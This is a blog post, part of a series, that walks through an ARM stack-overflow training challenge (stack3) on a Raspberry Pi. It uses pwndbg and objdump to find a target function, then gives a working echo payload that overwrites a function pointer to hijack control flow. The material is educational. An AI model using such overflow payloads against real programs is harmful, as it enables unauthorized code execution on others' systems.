<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Smashing ARM Stack for Fun - Part IV</title>
  <meta name="description" content="This time the goal is to make the program print the message"code flow successfully changed".">

  
    <link href='//fonts.googleapis.com/css?family=Lato:400,400italic' rel='stylesheet' type='text/css'>
  

  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        extensions: ["tex2jax.js"],
        jax: ["input/TeX","output/HTML-CSS"],
        tex2jax: {inlineMath: [["$$","$$"],["\\(","\\)"]]},
	TeX: {
	  Macros: {
            
	  }
	}
      });
    </script>
    
      <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js' async></script>
    
  

  
    <script
       src="https://code.jquery.com/jquery-3.4.1.min.js"
       integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
       crossorigin="anonymous"></script>
  

  

    
      <script src='https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore-min.js' ></script>
    

    
      <script src="https://d3js.org/d3.v4.min.js"></script>
    

    <script src='/book-of-gehn/js/venn/venn.min.js'></script>
    <script src='/book-of-gehn/js/venn/helper.js'></script>

    <script src='/book-of-gehn/js/fix_syntax_highlight.js'></script>
  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/tufte.css">
  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/latex.css">

  <link rel="canonical" href="/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV.html">

  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/all.min.css">

  <link type="application/atom+xml" rel="alternate" href="/book-of-gehn/feed.xml" title="The Book of Gehn" />
</head>

  <body>
    <header>
	
		<h1 class="header-title"><a href="/book-of-gehn/">The Book of Gehn</a></h1>
		
		
	

    

    
</header>

    <article class="group">
      <h1>Smashing ARM Stack for Fun - Part IV</h1>
<p class="subtitle">January 19, 2021</p>

<p>This time the goal is to make the program print the message
<code class="highlighter-rouge">"code flow successfully changed"</code>.<!--more--></p>

<h2 id="a-manual-xref">A manual <code class="highlighter-rouge">xref</code></h2>

<p>Let’s see where this message is stored:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">search</span> <span class="s">"code flow successfully changed"</span>
<span class="n">stack3</span>          <span class="mh">0x10560</span> <span class="mh">0x65646f63</span> <span class="o">/*</span> <span class="err">'</span><span class="n">code</span> <span class="n">flow</span> <span class="n">successfully</span> <span class="n">changed</span><span class="err">'*/</span>
<span class="n">stack3</span>          <span class="mh">0x20560</span> <span class="mh">0x65646f63</span> <span class="o">/*</span> <span class="err">'</span><span class="n">code</span> <span class="n">flow</span> <span class="n">successfully</span> <span class="n">changed</span><span class="err">'*/</span>
</code></pre></div></div>

<p>And from where the executable makes a reference to it? In other
words, where in the code segment this address is stored?</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">search</span> <span class="o">-</span><span class="mi">4</span> <span class="o">--</span><span class="n">executable</span> <span class="mh">0x10560</span>
<span class="n">stack3</span>          <span class="mh">0x10490</span> <span class="mh">0x10560</span>
<span class="n">stack3</span>          <span class="mh">0x10c6c</span> <span class="mh">0x10560</span>
<span class="n">stack3</span>          <span class="mh">0x20490</span> <span class="mh">0x10560</span>
</code></pre></div></div>

<p>To summarize the message (and array of chars) is stored at 0x10560
and the address 0x10560 is stored in 0x10490, 0x10c6c and 0x20490.</p>

<p>These addresses are the <code class="highlighter-rouge">char*</code> that the program must load into a
register to do a call to <code class="highlighter-rouge">printf</code> or <code class="highlighter-rouge">puts</code>.</p>

<p>Let’s assume that one of those addresses is loaded in a register using an
instruction like this:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;???&gt;</span>     <span class="n">ldr</span>   <span class="n">r</span><span class="o">?</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="n">offset</span><span class="o">?</span><span class="err">]</span>
</code></pre></div></div>

<p>It is a reasonable assumption: the rest of the challenges so far used
this instruction.</p>

<p>We don’t know neither which register will be using nor the offset so we
will have to guess.</p>

<p>Let’s see what we can find with <code class="highlighter-rouge">objdump</code> and <code class="highlighter-rouge">grep</code>:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pi</span><span class="err">@</span><span class="n">raspberrypi</span><span class="o">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">stack3</span> <span class="o">|</span> <span class="n">grep</span> <span class="s">"ldr.*r[0-9], \[pc"</span>
   <span class="mi">10374</span><span class="o">:</span>       <span class="n">e59f000c</span>        <span class="n">ldr</span>     <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">12</span><span class="err">]</span>   <span class="c">; 10388 &lt;_start+0x34&gt;</span>
   <span class="mi">10378</span><span class="o">:</span>       <span class="n">e59f300c</span>        <span class="n">ldr</span>     <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">12</span><span class="err">]</span>   <span class="c">; 1038c &lt;_start+0x38&gt;</span>
   <span class="mi">10390</span><span class="o">:</span>       <span class="n">e59f3014</span>        <span class="n">ldr</span>     <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">20</span><span class="err">]</span>   <span class="c">; 103ac &lt;call_weak_fn+0x1c&gt;</span>
   <span class="mi">10394</span><span class="o">:</span>       <span class="n">e59f2014</span>        <span class="n">ldr</span>     <span class="n">r2</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">20</span><span class="err">]</span>   <span class="c">; 103b0 &lt;call_weak_fn+0x20&gt;</span>
   <span class="mi">103</span><span class="n">b4</span><span class="o">:</span>       <span class="n">e59f301c</span>        <span class="n">ldr</span>     <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">28</span><span class="err">]</span>   <span class="c">; 103d8 &lt;deregister_tm_clones+0x24&gt;</span>
   <span class="mi">103</span><span class="n">b8</span><span class="o">:</span>       <span class="n">e59f001c</span>        <span class="n">ldr</span>     <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">28</span><span class="err">]</span>   <span class="c">; 103dc &lt;deregister_tm_clones+0x28&gt;</span>
   <span class="mi">103</span><span class="n">c8</span><span class="o">:</span>       <span class="n">e59f3010</span>        <span class="n">ldr</span>     <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">16</span><span class="err">]</span>   <span class="c">; 103e0 &lt;deregister_tm_clones+0x2c&gt;</span>
   <span class="mi">103</span><span class="n">e4</span><span class="o">:</span>       <span class="n">e59f1024</span>        <span class="n">ldr</span>     <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">36</span><span class="err">]</span>   <span class="c">; 10410 &lt;register_tm_clones+0x2c&gt;</span>
   <span class="mi">103</span><span class="n">e8</span><span class="o">:</span>       <span class="n">e59f0024</span>        <span class="n">ldr</span>     <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">36</span><span class="err">]</span>   <span class="c">; 10414 &lt;register_tm_clones+0x30&gt;</span>
   <span class="mi">10400</span><span class="o">:</span>       <span class="n">e59f3010</span>        <span class="n">ldr</span>     <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">16</span><span class="err">]</span>   <span class="c">; 10418 &lt;register_tm_clones+0x34&gt;</span>
   <span class="mi">10420</span><span class="o">:</span>       <span class="n">e59f4018</span>        <span class="n">ldr</span>     <span class="n">r4</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">24</span><span class="err">]</span>   <span class="c">; 10440 &lt;__do_global_dtors_aux+0x24&gt;</span>
   <span class="mi">10448</span><span class="o">:</span>       <span class="n">e59f0024</span>        <span class="n">ldr</span>     <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">36</span><span class="err">]</span>   <span class="c">; 10474 &lt;frame_dummy+0x30&gt;</span>
   <span class="mi">10460</span><span class="o">:</span>       <span class="n">e59f3010</span>        <span class="n">ldr</span>     <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">16</span><span class="err">]</span>   <span class="c">; 10478 &lt;frame_dummy+0x34&gt;</span>
   <span class="mi">10484</span><span class="o">:</span>       <span class="n">e59f0004</span>        <span class="n">ldr</span>     <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span><span class="err">]</span>    <span class="c">; 10490 &lt;win+0x14&gt;</span>
   <span class="mi">104</span><span class="n">c8</span><span class="o">:</span>       <span class="n">e59f0018</span>        <span class="n">ldr</span>     <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">24</span><span class="err">]</span>   <span class="c">; 104e8 &lt;main+0x54&gt;</span>
   <span class="mi">104</span><span class="n">f4</span><span class="o">:</span>       <span class="n">e59f604c</span>        <span class="n">ldr</span>     <span class="n">r6</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">76</span><span class="err">]</span>   <span class="c">; 10548 &lt;__libc_csu_init+0x5c&gt;</span>
   <span class="mi">104</span><span class="n">f8</span><span class="o">:</span>       <span class="n">e59f504c</span>        <span class="n">ldr</span>     <span class="n">r5</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">76</span><span class="err">]</span>   <span class="c">; 1054c &lt;__libc_csu_init+0x60&gt;</span>
</code></pre></div></div>

<p>These two lines are interesting:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mi">10484</span><span class="o">:</span>       <span class="n">e59f0004</span>        <span class="n">ldr</span>     <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span><span class="err">]</span>    <span class="c">; 10490 &lt;win+0x14&gt;</span>
   <span class="mi">104</span><span class="n">c8</span><span class="o">:</span>       <span class="n">e59f0018</span>        <span class="n">ldr</span>     <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">24</span><span class="err">]</span>   <span class="c">; 104e8 &lt;main+0x54&gt;</span>
</code></pre></div></div>

<p>And the winner is 0x10484!</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="mh">0x10484</span> <span class="o">+</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x8</span>
<span class="mh">0x10490</span>
</code></pre></div></div>

<p>See how 0x10484 the address of the <code class="highlighter-rouge">ldr</code> instruction plus the offset
<code class="highlighter-rouge">0x4</code> plus 0x8 bytes yields an address (0x10490) that we found before, a
<code class="highlighter-rouge">char*</code>.</p>

<p>If we dereference it we will see the address of the message:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">wx</span> <span class="mh">0x10490</span>
<span class="mh">0x10490</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;:</span>       <span class="mh">0x00010560</span>

<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">bs</span> <span class="mh">0x00010560</span>
<span class="mh">0x10560</span><span class="o">:</span>        <span class="s">"code flow successfully changed"</span>
</code></pre></div></div>

<p>So, our target is:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="mh">0x10484</span><span class="o">-</span><span class="mi">8</span>
 <span class="err">►</span> <span class="mh">0x1047c</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">&gt;</span>        <span class="k">push</span>   <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
   <span class="mh">0x10480</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>      <span class="k">add</span>    <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
   <span class="mh">0x10484</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>      <span class="n">ldr</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span><span class="err">]</span>
   <span class="mh">0x10488</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span>     <span class="n">bl</span>     <span class="err">#</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>

   <span class="mh">0x1048c</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>     <span class="k">pop</span>    <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">pc</span><span class="err">}</span>
</code></pre></div></div>

<h3 id="a-comment">A comment</h3>

<p>This is not the only way to do it.</p>

<p>I could search for a <code class="highlighter-rouge">puts</code> call which whole be more likely to be the
one that we are looking for:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span>objdump <span class="nt">-d</span> stack3 | <span class="nb">grep</span> <span class="s2">"puts"</span>
00010324 &lt;puts@plt&gt;:
   10488:       ebffffa5        bl      10324 &lt;puts@plt&gt;
</code></pre></div></div>

<p>I could look which functions are available:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">info</span> <span class="n">functions</span>
<span class="n">All</span> <span class="n">defined</span> <span class="n">functions</span><span class="o">:</span>

<span class="n">Non</span><span class="o">-</span><span class="n">debugging</span> <span class="n">symbols</span><span class="o">:</span>
<span class="mh">0x000102ec</span>  <span class="n">_init</span>
<span class="mh">0x0001030c</span>  <span class="n">printf</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x00010318</span>  <span class="n">gets</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x00010324</span>  <span class="n">puts</span><span class="err">@</span><span class="n">plt</span>
<span class="o">&lt;</span><span class="p">...</span><span class="o">&gt;</span>
<span class="mh">0x0001047c</span>  <span class="n">win</span>
<span class="mh">0x00010494</span>  <span class="n">main</span>
<span class="o">&lt;</span><span class="p">...</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>I could use IDA or <a href="https://rada.re/n/radare2.html">Radare2</a> or similar
and do a <code class="highlighter-rouge">xref</code>…</p>

<p>Or I could just read what is the goal from the
<a href="https://azeria-labs.com/part-3-stack-overflow-challenges/">challenge</a>.</p>

<p>I preferred a longer path to explore more the commands of <code class="highlighter-rouge">pwndbg</code>
and stress a little more my brain.</p>

<p>Otherwise it wouldn’t be fun :)</p>

<h2 id="lets-jump">Let’s jump</h2>

<p>This is the <code class="highlighter-rouge">main</code> function:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">main</span> <span class="mi">9</span>
 <span class="err">►</span> <span class="mh">0x10494</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span>       <span class="k">push</span>   <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
   <span class="mh">0x10498</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>     <span class="k">add</span>    <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
   <span class="mh">0x1049c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>     <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x50</span>
   <span class="mh">0x104a0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x50</span><span class="err">]</span>
   <span class="mh">0x104a4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x54</span><span class="err">]</span>
   <span class="mh">0x104a8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x104ac</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
   <span class="mh">0x104b0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>    <span class="k">sub</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x48</span>
   <span class="mh">0x104b4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
   <span class="mh">0x104b8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>

   <span class="mh">0x104bc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
   <span class="mh">0x104c0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>    <span class="k">cmp</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x104c4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;</span>    <span class="n">beq</span>    <span class="err">#</span><span class="n">main</span><span class="o">+</span><span class="mi">72</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">72</span><span class="o">&gt;</span>

   <span class="mh">0x104c8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">52</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x18</span><span class="err">]</span>
   <span class="mh">0x104cc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
   <span class="mh">0x104d0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>

   <span class="mh">0x104d4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
   <span class="mh">0x104d8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span>    <span class="n">blx</span>    <span class="n">r3</span>
</code></pre></div></div>

<p>So instead of a cookie like in the
<a href="/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html">stack0</a>
or <a href="/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-II.html">stack1</a>
we have the address of a function.</p>

<p><label for="mn-5770f2836672d8a9a1954be60d8102c9" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-5770f2836672d8a9a1954be60d8102c9" class="margin-toggle" /><span class="marginnote"><code class="highlighter-rouge">blx r3</code> is an unconditional jump to an absolute address
(<a href="https://developer.arm.com/documentation/dui0068/b/arm-instruction-reference/arm-branch-instructions/blx?lang=en">docs</a>).
<br />
That's why it works.
 </span></p>

<p>The address is initialized to zero but due to a stack overflow we can
write an arbitrary address, in particular, the address of <code class="highlighter-rouge">win</code>:
0x0001047c</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\x04\x01\x00'</span> | ./stack3
calling <span class="k">function </span>pointer, jumping to 0x0001047c
code flow successfully changed
</code></pre></div></div>

<p>We could also jump to the middle of <code class="highlighter-rouge">win</code>, to 0x00010484, and we will
have the same result. The only problem is that the program will execute
the <em>epilogue</em> of <code class="highlighter-rouge">win</code> <strong>without</strong> having executed its <em>prologue</em>.</p>

<p><label for="mn-31554f46753f568be15bed866ad590c3" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-31554f46753f568be15bed866ad590c3" class="margin-toggle" /><span class="marginnote">Does this ring some bells? This is the base of <em>return oriented
programming</em> or ROP.
 </span></p>

<p>The result? <code class="highlighter-rouge">pop {fp, pc}</code> will restore <code class="highlighter-rouge">pc</code> to the next element in the
stack which most likely will not be a valid address. Happy segfault!</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x84\x04\x01\x00'</span> | ./stack3
calling <span class="k">function </span>pointer, jumping to 0x00010484
code flow successfully changed
Segmentation fault
</code></pre></div></div>



    </article>
    <span class="print-footer">Smashing ARM Stack for Fun - Part IV - January 19, 2021 - Gehn</span>
    <footer>
    <hr class="slender">
    <div class="credits">
        <span>&copy; 2021
            
            Gehn
        </span></br>
            <a style="text-decoration: none;" href="/book-of-gehn/feed.xml"><img height="16px" width="16px" src="/book-of-gehn/assets/blog-assets/rss-32px.png" /></a>
        <br>
        

    
    </div>
</footer>

  </body>
</html>
